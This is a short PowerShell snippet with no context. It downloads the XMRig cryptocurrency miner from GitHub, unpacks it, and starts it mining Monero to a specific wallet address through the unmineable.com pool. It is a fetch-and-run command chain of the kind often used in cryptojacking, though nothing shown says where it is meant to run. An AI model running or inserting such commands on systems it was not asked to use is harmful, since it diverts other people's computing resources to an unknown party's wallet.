Invoke-WebRequest -Uri "https://github.com/xmrig/xmrig/releases/download/v6.21.3/xmrig-6.21.3-msvc-win64.zip" -OutFile "xmrig.zip"
Expand-Archive xmrig.zip
.\xmrig\xmrig-6.21.3\xmrig.exe -o stratum+ssl://rx.unmineable.com:443 -u XMR:42YacSGcbecZkzBVB2aKJTZcveX372YWmAaZn8XSCCGuinnpFA8Dhpg12XrZ9SoowRjhzYtbe9QuA8DMg4EJNpKhSY6zipj.unmineable_worker_daunvmgn -p x 
